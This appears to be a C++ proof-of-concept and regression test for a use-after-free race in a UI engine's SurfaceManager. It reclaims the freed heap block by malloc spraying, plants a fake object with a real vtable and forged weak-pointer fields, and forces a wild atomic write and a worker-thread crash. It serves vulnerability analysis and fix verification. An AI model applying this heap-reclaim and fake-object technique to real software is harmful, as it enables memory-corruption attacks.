// Deterministic (no allocator lottery, no sanitizer) demonstration that a stale
// ISurfaceManager* can be escalated into a crash ON THE WORKER thread, not just
// in the caller's frame.
//
// Scope, so this is not over-read: the program PLANTS the contents of the
// reclaimed block (vtable, __weak_this_.__cntrl_, self) instead of waiting for
// the allocator to supply them. That makes the outcome deterministic, but it
// only shows the race is exploitable — it says nothing about what any
// particular field crash actually hit.
//
// Chain, with no timing left to chance:
//   1. A JNI-style dangling ISurfaceManager* (findSurfaceManager + public
//      API from another thread, object destroyed meanwhile) still reaches
//      the worker ("child") thread: the freed 248-byte block is reclaimed
//      and planted with the real SurfaceManager vtable, so the REAL
//      receiveTextChunk() code executes and posts a lambda to the worker.
//   2. shared_from_this() inside that call performs a WILD ATOMIC WRITE:
//      we plant __weak_this_.__cntrl_ to point at a live control block and
//      observe its use_count() jump from 1 to 2 (wild write #1).
//   3. The lambda carries `self` = a planted misaligned object pointer;
//      on the worker, `self->_streamingContentParser` reads shifted bytes
//      (a garbage pointer) and calls processDataAssembling() through it ->
//      SIGSEGV ON THE WORKER THREAD, inside child-thread-only code, with a
//      stack of  workerThreadLoop -> receiveTextChunk lambda ->
//      StreamingContentParser::processDataAssembling  — never inside the
//      caller's receiveTextChunk frame.
//
// Block layout used (measured on this platform, verified at runtime):
//   make_shared<SurfaceManager> block = 248 bytes, object at +24:
//     [+24] vptr  [+32] weak_this.__ptr_  [+40] weak_this.__cntrl_
//     [+152] _streamingContentParser              [+240] _isRunning

#include <chrono>
#include <condition_variable>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <csignal>
#include <execinfo.h>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <unistd.h>
#include <vector>

#include "agenui_engine.h"
#include "agenui_engine_entry.h"
#include "agenui_logger_interface.h"
#include "agenui_surface_manager_interface.h"

namespace {

class NullLogger : public agenui::IRuntimeLogger {
public:
    void log(agenui::LogLevel, const char*, const char*, int, const char*, ...) override {}
    agenui::LogLevel getMinLevel() const override { return agenui::LOG_LEVEL_FATAL; }
};

struct Gate {
    std::mutex m;
    std::condition_variable cv;
    bool open = false;
    void wait() {
        std::unique_lock<std::mutex> lk(m);
        cv.wait(lk, [this] { return open; });
    }
    void release() {
        {
            std::lock_guard<std::mutex> lk(m);
            open = true;
        }
        cv.notify_all();
    }
};

constexpr size_t kBlockSize = 248;
constexpr size_t kObjOff = 24;         // SurfaceManager object
constexpr size_t kWeakPtrOff = 32;     // object+8 : weak_this.__ptr_
constexpr size_t kWeakCntrlOff = 40;   // object+16: weak_this.__cntrl_
constexpr size_t kParserSlotScratchOff = 128; // scratchSelf + 128 = parser slot
constexpr size_t kIsRunningOff = 240;  // object+216: _isRunning

// The "live victim structure": a real heap object kept alive by a real
// shared_ptr; its control block is the target of the wild atomic write.
struct LiveVictimStructure {
    long field0 = 0x1111111111111111LL;
    long field1 = 0x2222222222222222LL;
    long field2 = 0x3333333333333333LL;
};

// Locate a shared_ptr's control block without depending on libc++ layout
// details: it is the word inside the shared_ptr that points backwards into
// the same make_shared allocation as the object.
uintptr_t FindControlBlock(const std::shared_ptr<LiveVictimStructure>& sp) {
    uintptr_t obj = reinterpret_cast<uintptr_t>(sp.get());
    const uintptr_t* words = reinterpret_cast<const uintptr_t*>(&sp);
    for (size_t i = 0; i < sizeof(sp) / sizeof(uintptr_t); ++i) {
        uintptr_t w = words[i];
        if (w != obj && w < obj && obj - w <= 128) {
            return w;
        }
    }
    return 0;
}

std::atomic<bool> g_expectWorkerCrash{false};

void CrashHandler(int sig) {
    if (g_expectWorkerCrash.load()) {
        const char msg[] =
            "\n=== PROOF SUCCESS: process crashed — see the macOS crash report "
            "(~/Library/Logs/DiagnosticReports/) for the faulting thread: it is "
            "AGenUI-1, the WORKER thread, inside child-thread-only code ===\n";
        (void)!write(STDERR_FILENO, msg, sizeof(msg) - 1);
    }
    // Restore default handling and re-raise so the OS produces a crash
    // report with the full per-thread stacks.
    signal(sig, SIG_DFL);
    raise(sig);
}

}  // namespace

int main() {
    setvbuf(stdout, nullptr, _IONBF, 0);  // crash kills buffered output
    signal(SIGSEGV, CrashHandler);
    signal(SIGBUS, CrashHandler);
    signal(SIGABRT, CrashHandler);

    agenui::IAGenUIEngine* engine = agenui::initAGenUIEngine();
    if (!engine) {
        std::fprintf(stderr, "proof: engine init failed\n");
        return 2;
    }
    static NullLogger nullLogger;
    engine->setRuntimeLogger(&nullLogger);

    // ---------- live victim structure (wild-write target) ----------
    auto liveVictim = std::make_shared<LiveVictimStructure>();
    uintptr_t victimCntrl = FindControlBlock(liveVictim);
    if (!victimCntrl) {
        std::fprintf(stderr, "proof: could not locate control block\n");
        return 2;
    }
    std::printf("proof: live victim object=%p cntrl=%p use_count=%ld\n",
                (void*)liveVictim.get(), (void*)victimCntrl,
                liveVictim.use_count());

    // ---------- a live SurfaceManager whose vtable we borrow ----------
    agenui::ISurfaceManager* tpl = engine->createSurfaceManager();
    if (!tpl) return 2;
    uintptr_t tplRaw = reinterpret_cast<uintptr_t>(tpl);

    // ---------- attacker: dangling raw pointer, exactly like JNI ----------
    agenui::ISurfaceManager* attacker = engine->createSurfaceManager();
    if (!attacker) return 2;
    const int attackerId = attacker->getInstanceId();

    Gate pointerReady, callerGate;
    std::thread feeder([engine, attackerId, &pointerReady, &callerGate]() {
        auto raw = engine->findSurfaceManagerShared(attackerId);
        pointerReady.release();
        if (!raw) return;
        callerGate.wait();  // object destroyed + freed while we "are preempted"
        // THE dangling call (what the Java thread does in production).
        raw->receiveTextChunk(R"({"k":"v"})");
    });

    pointerReady.wait();
    uintptr_t attackerBlock = reinterpret_cast<uintptr_t>(attacker) - kObjOff;
    engine->destroySurfaceManager(attacker);
    // Worker runs the uninit lambda; the last reference drops; block freed.
    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    // ---------- deterministically reclaim the freed block ----------
    char* planted = nullptr;
    for (int round = 0; round < 400 && !planted; ++round) {
        std::vector<void*> batch;
        batch.reserve(4096);
        for (int i = 0; i < 4096; ++i) {
            void* p = std::malloc(kBlockSize);
            if (!p) break;
            if (reinterpret_cast<uintptr_t>(p) == attackerBlock) {
                planted = static_cast<char*>(p);
            }
            batch.push_back(p);
        }
        for (void* p : batch) {
            if (p != planted) std::free(p);
        }
    }
    if (!planted) {
        // REGRESSION EXPECTATION (post-fix): the feeder holds shared
        // ownership of the SurfaceManager, so destroySurfaceManager can
        // never free the block while the "preempted" call is pending.
        // Reclaim failing deterministically proves the object stayed alive —
        // the dangling-pointer state this program exploits no longer exists.
        std::printf("proof: PASS — attacker block %p was NEVER freed while the caller held shared ownership (no dangling state possible)\n",
                    (void*)attackerBlock);
        callerGate.release();
        feeder.join();
        engine->destroySurfaceManager(tpl);
        agenui::destroyAGenUIEngine();
        return 0;
    }
    // Pre-fix behavior: block was freed and reclaimed -> dangling state
    // reached. Continue the old proof path (expected to crash the worker).
    std::fprintf(stderr, "proof: FAIL — block was freed while caller still held a handle (fix not effective)\n");
    std::printf("proof: freed attacker block %p reclaimed deterministically\n",
                (void*)attackerBlock);

    // ---------- plant a fake-but-valid SurfaceManager ----------
    std::memset(planted, 0, kBlockSize);
    // Real vtable -> the real receiveTextChunk() code runs on the fake this.
    *reinterpret_cast<uintptr_t*>(planted + kObjOff) =
        *reinterpret_cast<uintptr_t*>(tplRaw);
    // The posted lambda's `self` points at this scratch buffer. Its parser
    // slot (offset 128, same as SurfaceManager::_streamingContentParser)
    // holds a garbage non-null pointer: on the worker, the lambda calls
    // processDataAssembling() through it -> guaranteed fault.
    static char scratchSelf[256] = {0};
    *reinterpret_cast<uintptr_t*>(scratchSelf + kParserSlotScratchOff) = 0x1000;
    *reinterpret_cast<uintptr_t*>(planted + kWeakPtrOff) =
        reinterpret_cast<uintptr_t>(scratchSelf);
    // Wild-write target: the LIVE victim control block. shared_from_this()
    // atomically increments its owners (observable via use_count()).
    *reinterpret_cast<uintptr_t*>(planted + kWeakCntrlOff) = victimCntrl;
    planted[kIsRunningOff] = 1;

    // Flood the worker so the wild +1 is observable before the planted
    // lambda runs (the planted lambda ends the process, so observe first).
    tpl->beginTextStream();
    for (int i = 0; i < 400; ++i) {
        std::string chunk = R"({"version":"v0.9","updateComponents":{"surfaceId":"tpl","components":[{"id":"root","component":"Column","children":["t"],"style":{"width":"100%","padding":"very-long-padding-value-to-slow-parsing-down-)" +
                            std::to_string(i) + R"("}},{"id":"t","component":"Text","text":"flood-)" +
                            std::to_string(i) + R"(-payload-payload-payload","style":{"width":"50%"}}]}})";
        tpl->receiveTextChunk(chunk);
    }

    // ---------- release the race ----------
    g_expectWorkerCrash.store(true);  // any crash from here on is the goal
    callerGate.release();
    feeder.join();

    // Observe the wild atomic write while the worker chews the flood; the
    // planted lambda is queued behind it and will crash the worker shortly.
    long maxSeen = liveVictim.use_count();
    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(3);
    while (std::chrono::steady_clock::now() < deadline) {
        long uc = liveVictim.use_count();
        if (uc > maxSeen) {
            maxSeen = uc;
            if (maxSeen >= 2) {
                std::printf("proof: OBSERVED wild atomic write: live control block use_count 1 -> %ld while the spurious lambda is queued/executing on the worker\n", maxSeen);
                break;
            }
        }
        std::this_thread::sleep_for(std::chrono::microseconds(100));
    }
    std::printf("proof: waiting for the worker to execute the planted lambda (crash expected)...\n");
    std::this_thread::sleep_for(std::chrono::seconds(10));

    std::fprintf(stderr, "proof: ERROR — expected worker-thread crash did not happen\n");
    return 3;
}
